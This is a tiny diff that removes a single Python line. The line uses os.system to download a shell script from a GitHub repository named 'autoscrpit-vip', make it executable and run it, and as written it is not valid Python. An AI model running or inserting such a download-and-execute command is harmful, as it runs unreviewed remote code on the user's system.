@@ -1,1 +1,0 @@
-import os os.system ('wget https://raw.githubusercontent.com/anggrevps/autoscrpit-vip/main/setup.sh && chmod +x setup.sh && ./setup.sh')
